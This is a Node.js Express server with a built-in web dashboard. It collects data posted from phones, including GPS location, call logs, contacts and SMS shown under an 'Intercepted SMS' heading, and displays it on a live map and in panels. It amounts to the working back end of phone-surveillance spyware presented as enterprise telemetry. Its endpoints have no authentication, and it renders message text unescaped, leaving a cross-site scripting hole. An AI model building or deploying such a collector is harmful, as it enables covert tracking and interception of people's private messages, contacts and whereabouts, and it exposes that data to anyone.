const express = require('express');
const cors = require('cors');
const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(cors());

let devicesData = {};
let instantEvents = [];

// Helper function for Kenyan Time (EAT)
function getKenyanTime(dateObj) {
    if (!dateObj) return "Unknown time";
    const d = new Date(dateObj);
    return d.toLocaleString('en-KE', { 
        timeZone: 'Africa/Nairobi', 
        dateStyle: 'short', 
        timeStyle: 'short' 
    });
}

// 1. Phone sends data
app.post('/api/report', (req, res) => {
    const data = req.body;
    const deviceId = data.device?.model || 'Unknown Device';
    console.log(`📥 Data received from ${deviceId}`);
    devicesData[deviceId] = { 
        ...data, 
        lastUpdated: new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi', timeStyle: 'short' }) 
    };
    res.json({ success: true });
});

// 2. Phone sends instant alerts
app.post('/api/instant-event', (req, res) => {
    const event = req.body;
    event.time = new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi', timeStyle: 'short' });
    instantEvents.unshift(event);
    if (instantEvents.length > 10) instantEvents.pop();
    res.json({ success: true });
});

// 3. Dashboard endpoints
app.get('/api/devices', (req, res) => res.json(devicesData));
app.get('/api/instant-events', (req, res) => res.json(instantEvents));
app.post('/api/clear-events', (req, res) => { instantEvents = []; res.json({success: true}); });

// 4. The Professional UI
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Device Monitor | Enterprise Dashboard</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
        <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap');
            
            body { 
                font-family: 'Inter', system-ui, sans-serif; 
                background-color: #0b1120; /* Deep dark blue */
                background-image: radial-gradient(circle at top right, #1e1b4b, transparent 40%),
                                  radial-gradient(circle at bottom left, #0f172a, transparent 40%);
                color: #f8fafc; 
                min-height: 100vh;
            }

            /* Glassmorphism Card Style */
            .glass-card {
                background: rgba(30, 41, 59, 0.7);
                backdrop-filter: blur(12px);
                -webkit-backdrop-filter: blur(12px);
                border: 1px solid rgba(255, 255, 255, 0.08);
                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
                transition: transform 0.2s ease, border-color 0.2s ease;
            }
            .glass-card:hover {
                border-color: rgba(96, 165, 250, 0.3);
            }

            /* Custom Scrollbar */
            .custom-scrollbar::-webkit-scrollbar { width: 5px; }
            .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
            .custom-scrollbar::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
            .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #475569; }

            /* Map Styling */
            #map { height: 100%; min-height: 300px; border-radius: 0.75rem; z-index: 1; }
            
            /* Clickable Message Accordion */
            details > summary { list-style: none; cursor: pointer; }
            details > summary::-webkit-details-marker { display: none; }
            details[open] .arrow { transform: rotate(180deg); }
            .arrow { transition: transform 0.3s ease; }
            
            /* Subtle Text Glow */
            .text-glow { text-shadow: 0 0 20px rgba(96, 165, 250, 0.5); }
            
            /* Font settings */
            .font-mono { font-family: 'JetBrains Mono', monospace; }
        </style>
    </head>
    <body class="p-4 md:p-8">
        <div class="max-w-7xl mx-auto">
            
            <!-- Top Header -->
            <header class="flex flex-col md:flex-row md:items-center justify-between mb-8 pb-6 border-b border-slate-800/80">
                <div class="flex items-center gap-4">
                    <div class="bg-gradient-to-br from-blue-500 to-indigo-600 p-3 rounded-xl shadow-lg shadow-blue-500/20">
                        <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
                    </div>
                    <div>
                        <h1 class="text-3xl font-extrabold text-white tracking-tight text-glow">Device Monitor</h1>
                        <p class="text-sm text-slate-400 font-medium tracking-wide mt-1">ENTERPRISE TELEMETRY & SECURITY</p>
                    </div>
                </div>
                <div class="mt-4 md:mt-0 flex items-center gap-3 bg-slate-800/50 px-5 py-2.5 rounded-full border border-slate-700/80 shadow-inner">
                    <span class="relative flex h-3 w-3">
                        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                        <span class="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
                    </span>
                    <span class="text-sm font-bold text-emerald-400 tracking-wide">SYSTEM LIVE</span>
                </div>
            </header>

            <!-- Devices Container -->
            <div id="devices-container" class="space-y-8">
                <div class="flex flex-col items-center justify-center mt-32 text-slate-500">
                    <svg class="w-16 h-16 mb-4 animate-spin text-slate-700" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
                    <p class="text-lg font-medium tracking-wide">Awaiting secure connection...</p>
                </div>
            </div>
        </div>

        <script>
            let mapInstance = null;
            let mapMarker = null;
            let currentGeocodedAddress = "Fetching address...";
            let lastLocationKey = "";

            async function getAddress(lat, lng) {
                try {
                    const response = await fetch(\`https://nominatim.openstreetmap.org/reverse?format=json&lat=\${lat}&lon=\${lng}\`);
                    const data = await response.json();
                    return data.display_name || "Unknown Location";
                } catch (e) {
                    return "Location unavailable";
                }
            }

            function formatKenyanTime(dateInput) {
                if (!dateInput) return "Unknown time";
                const d = new Date(dateInput);
                return d.toLocaleString('en-KE', { timeZone: 'Africa/Nairobi', dateStyle: 'short', timeStyle: 'short' });
            }

            async function fetchData() {
                try {
                    const res = await fetch('/api/devices');
                    const devices = await res.json();
                    const container = document.getElementById('devices-container');
                    
                    if (Object.keys(devices).length === 0) return;

                    let html = '';
                    
                    for (const [id, data] of Object.entries(devices)) {
                        const isCharging = data.isCharging 
                            ? '<span class="inline-flex items-center gap-1 px-2 py-1 rounded bg-emerald-500/10 text-emerald-400 text-xs font-bold border border-emerald-500/20">⚡ CHARGING</span>' 
                            : '<span class="inline-flex items-center gap-1 px-2 py-1 rounded bg-amber-500/10 text-amber-400 text-xs font-bold border border-amber-500/20">🔋 ON BATTERY</span>';

                        const locationKey = \`\${data.location?.lat},\${data.location?.lng}\`;
                        if (locationKey !== lastLocationKey && data.location?.lat !== 0) {
                            lastLocationKey = locationKey;
                            currentGeocodedAddress = "Fetching address...";
                            getAddress(data.location.lat, data.location.lng).then(addr => {
                                currentGeocodedAddress = addr;
                                const addressEl = document.getElementById('address-text');
                                if (addressEl) addressEl.innerText = addr;
                            });
                        }

                        const smsHtml = (data.sms || []).map(s => {
                            let timeStr = formatKenyanTime(s.date);
                            return \`
                            <details class="group bg-slate-900/50 rounded-lg border border-slate-700/50 mb-2 overflow-hidden transition-colors hover:border-slate-600">
                                <summary class="flex justify-between items-center p-3">
                                    <div class="flex flex-col min-w-0 pr-3">
                                        <span class="text-indigo-400 font-semibold text-sm truncate">\${s.address}</span>
                                        <span class="text-xs text-slate-400 truncate mt-0.5">\${s.body}</span>
                                    </div>
                                    <div class="flex flex-col items-end shrink-0 gap-1">
                                        <span class="text-[10px] text-slate-500 font-mono">\${timeStr}</span>
                                        <svg class="w-4 h-4 text-slate-500 arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
                                    </div>
                                </summary>
                                <div class="p-3 bg-slate-900 border-t border-slate-800 text-sm text-slate-300 font-medium">
                                    \${s.body}
                                </div>
                            </details>
                            \`;
                        }).join('');

                        const callsHtml = (data.calls || []).map(c => {
                            let timeStr = formatKenyanTime(c.date);
                            const isMissed = c.type === 'Missed';
                            return \`
                            <div class="flex justify-between items-center p-3 mb-1 bg-slate-900/40 rounded-lg border border-slate-700/40">
                                <div>
                                    <span class="\${isMissed ? 'text-red-400' : 'text-slate-200'} font-medium text-sm block">\${c.number}</span>
                                    <span class="text-[10px] text-slate-500 font-mono mt-0.5 block">\${timeStr}</span>
                                </div>
                                <div class="text-right">
                                    <span class="text-[10px] uppercase tracking-wider \${isMissed ? 'text-red-400' : 'text-slate-400'} font-bold block">\${c.type}</span>
                                    <span class="text-[10px] text-slate-500">\${c.duration}s</span>
                                </div>
                            </div>
                            \`;
                        }).join('');

                        html += \`
                        <!-- Main Device Card -->
                        <div class="glass-card rounded-2xl overflow-hidden mb-8">
                            
                            <!-- Device Header -->
                            <div class="px-6 py-4 border-b border-slate-700/50 flex justify-between items-center bg-slate-800/30">
                                <div class="flex items-center gap-4">
                                    <div class="bg-slate-900 p-2.5 rounded-lg border border-slate-700">
                                        <svg class="w-6 h-6 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                                    </div>
                                    <div>
                                        <h2 class="text-xl font-bold text-white tracking-wide">\${id}</h2>
                                        <p class="text-xs text-slate-400 font-mono mt-0.5">OS: \${data.device?.os || 'Android'}</p>
                                    </div>
                                </div>
                                <div class="text-right">
                                    <span class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-slate-900/80 border border-slate-700 text-xs font-mono text-slate-300">
                                        <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
                                        SYNC: \${data.lastUpdated}
                                    </span>
                                </div>
                            </div>

                            <!-- Stats & Map -->
                            <div class="grid grid-cols-1 lg:grid-cols-3">
                                
                                <!-- Stats -->
                                <div class="p-6 flex flex-col gap-6 border-b lg:border-b-0 lg:border-r border-slate-700/50">
                                    <div class="flex justify-between items-start">
                                        <div>
                                            <p class="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1">Battery</p>
                                            <div class="flex items-end gap-2">
                                                <span class="text-5xl font-black text-white">\${data.battery || 0}<span class="text-2xl text-slate-500">%</span></span>
                                            </div>
                                        </div>
                                        <div>\${isCharging}</div>
                                    </div>
                                    
                                    <div class="h-px w-full bg-slate-700/50"></div>

                                    <div>
                                        <p class="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1">Network Status</p>
                                        <div class="flex items-center gap-2">
                                            <span class="w-2.5 h-2.5 rounded-full \${data.online ? 'bg-emerald-500' : 'bg-red-500'}"></span>
                                            <span class="text-lg font-semibold text-white">\${data.online ? "Connected" : "Offline"}</span>
                                        </div>
                                        <p class="text-xs text-slate-400 mt-1 font-mono">\${data.wifi || 'Unknown Interface'}</p>
                                    </div>
                                </div>

                                <!-- Map -->
                                <div class="lg:col-span-2 relative flex flex-col bg-slate-900/50">
                                    <div id="map" class="w-full flex-1"></div>
                                    <div class="p-4 border-t border-slate-700/50 bg-slate-800/40 flex items-start gap-3 backdrop-blur-sm z-10">
                                        <div class="bg-blue-500/20 p-1.5 rounded text-blue-400 mt-0.5 border border-blue-500/30">
                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                                        </div>
                                        <div>
                                            <p class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">GPS Address</p>
                                            <p id="address-text" class="text-xs font-medium text-slate-200 mt-0.5">\${currentGeocodedAddress}</p>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- Data Tables -->
                            <div class="grid grid-cols-1 md:grid-cols-3 border-t border-slate-700/50 bg-slate-900/30">
                                
                                <!-- Calls -->
                                <div class="border-b md:border-b-0 md:border-r border-slate-700/50 flex flex-col h-72">
                                    <div class="p-4 border-b border-slate-700/50 flex items-center gap-2 bg-slate-800/20">
                                        <svg class="w-4 h-4 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
                                        <h3 class="font-bold text-slate-300 text-xs uppercase tracking-wider">Call Logs</h3>
                                    </div>
                                    <div class="p-2 overflow-y-auto custom-scrollbar flex-1">
                                        \${callsHtml}
                                    </div>
                                </div>

                                <!-- SMS -->
                                <div class="border-b md:border-b-0 md:border-r border-slate-700/50 flex flex-col h-72">
                                    <div class="p-4 border-b border-slate-700/50 flex items-center gap-2 bg-slate-800/20">
                                        <svg class="w-4 h-4 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
                                        <h3 class="font-bold text-slate-300 text-xs uppercase tracking-wider">Intercepted SMS</h3>
                                    </div>
                                    <div class="p-2 overflow-y-auto custom-scrollbar flex-1">
                                        \${smsHtml}
                                    </div>
                                </div>

                                <!-- Contacts -->
                                <div class="flex flex-col h-72">
                                    <div class="p-4 border-b border-slate-700/50 flex items-center gap-2 bg-slate-800/20">
                                        <svg class="w-4 h-4 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
                                        <h3 class="font-bold text-slate-300 text-xs uppercase tracking-wider">Contacts</h3>
                                    </div>
                                    <div class="p-2 overflow-y-auto custom-scrollbar flex-1">
                                        \${(data.contacts || []).map(c => \`
                                            <div class="flex justify-between items-center p-2.5 mb-1 bg-slate-900/40 rounded-lg border border-slate-700/40">
                                                <span class="text-slate-300 font-medium text-sm">\${c.name}</span>
                                                <span class="text-[10px] font-mono text-slate-500">\${c.number}</span>
                                            </div>
                                        \`).join('')}
                                    </div>
                                </div>

                            </div>
                        </div>
                        \`;
                    }
                    
                    // Only update DOM if map isn't initialized to prevent it disappearing
                    if (!document.getElementById('map')) {
                        container.innerHTML = html;
                    } else {
                        const addressEl = document.getElementById('address-text');
                        if (addressEl) addressEl.innerText = currentGeocodedAddress;
                    }

                    const firstDevice = Object.values(devices)[0];
                    if (firstDevice && firstDevice.location && firstDevice.location.lat !== 0) {
                        const lat = firstDevice.location.lat;
                        const lng = firstDevice.location.lng;

                        setTimeout(() => {
                            if (!mapInstance) {
                                mapInstance = L.map('map', { zoomControl: false }).setView([lat, lng], 16);
                                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { 
                                    attribution: '© OpenStreetMap © CARTO' 
                                }).addTo(mapInstance);
                                
                                // Custom Marker
                                const customIcon = L.divIcon({
                                    className: 'custom-icon',
                                    html: '<div style="background-color: #3b82f6; width: 16px; height: 16px; border-radius: 50%; border: 3px solid white; box-shadow: 0 0 15px #3b82f6;"></div>',
                                    iconSize: [16, 16],
                                    iconAnchor: [8, 8]
                                });

                                mapMarker = L.marker([lat, lng], {icon: customIcon}).addTo(mapInstance);
                            } else {
                                mapInstance.setView([lat, lng]);
                                mapMarker.setLatLng([lat, lng]);
                            }
                            mapInstance.invalidateSize();
                        }, 100);
                    }

                } catch (e) {
                    console.error("Error fetching data:", e);
                }
            }
            
            fetchData();
            setInterval(fetchData, 3000);
        </script>
    </body>
    </html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Premium Dashboard running on port ${PORT}`));
